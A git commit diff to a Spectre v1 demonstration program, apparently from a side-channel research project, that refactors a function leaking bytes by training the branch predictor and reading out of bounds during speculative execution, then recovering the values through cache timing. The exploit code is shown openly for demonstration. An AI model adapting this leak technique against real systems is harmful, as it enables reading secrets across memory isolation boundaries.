2b84f7c5f9873289db0e8d043b22c22e0e194927
Craig Disselkoen <cdisselk@eng.ucsd.edu>
2020-10-14 10:57:52 -0700

    pht_sa: hardcode public_data reference

--- demos/spectre_v1_pht_sa.cc
+++ demos/spectre_v1_pht_sa.cc
@@ -25,15 +25,15 @@
 #include "timing_array.h"
 #include "utils.h"
 
-// Leaks the byte that is physically located at &text[0] + offset, without ever
-// loading it. In the abstract machine, and in the code executed by the CPU,
-// this function does not load any memory except for what is in the bounds
-// of `text`, and local auxiliary data.
+// Leaks the byte that is physically located at &public_data[0] + offset,
+// without ever loading it. In the abstract machine, and in the code executed
+// by the CPU, this function does not load any memory except for what is in the
+// bounds of `public_data`, and local auxiliary data.
 //
 // Instead, the leak is performed by accessing out-of-bounds during speculative
 // execution, bypassing the bounds check by training the branch predictor to
 // think that the value will be in-range.
-static char LeakByte(const char *data, size_t offset) {
+static char LeakByte(size_t offset) {
   TimingArray timing_array;
   // The size needs to be unloaded from cache to force speculative execution
   // to guess the result of comparison.
@@ -41,14 +41,14 @@ static char LeakByte(const char *data, size_t offset) {
   // TODO(asteinha): since size_in_heap is no longer the only heap-allocated
   // value, it should be allocated into its own unique page
   std::unique_ptr<size_t> size_in_heap = std::unique_ptr<size_t>(
-      new size_t(strlen(data)));
+      new size_t(strlen(public_data)));
 
   for (int run = 0;; ++run) {
     timing_array.FlushFromCache();
     // We pick a different offset every time so that it's guaranteed that the
     // value of the in-bounds access is usually different from the secret value
     // we want to leak via out-of-bounds speculative access.
-    int safe_offset = run % strlen(data);
+    int safe_offset = run % strlen(public_data);
 
     // Loop length must be high enough to beat branch predictors.
     // The current length 2048 was established empirically. With significantly
@@ -74,12 +74,12 @@ static char LeakByte(const char *data, size_t offset) {
         // This branch was trained to always be taken during speculative
         // execution, so it's taken even on the 2048th iteration, when the
         // condition is false!
-        ForceRead(&timing_array[data[local_offset]]);
+        ForceRead(&timing_array[public_data[local_offset]]);
       }
     }
 
-    int ret = timing_array.FindFirstCachedElementIndexAfter(data[safe_offset]);
-    if (ret >= 0 && ret != data[safe_offset]) {
+    int ret = timing_array.FindFirstCachedElementIndexAfter(public_data[safe_offset]);
+    if (ret >= 0 && ret != public_data[safe_offset]) {
       return ret;
     }
 
@@ -98,7 +98,7 @@ int main() {
     // On at least some machines, this will print the i'th byte from
     // private_data, despite the only actually-executed memory accesses being
     // to valid bytes in public_data.
-    std::cout << LeakByte(public_data, private_offset + i);
+    std::cout << LeakByte(private_offset + i);
     std::cout.flush();
   }
   std::cout << "\nDone!\n";
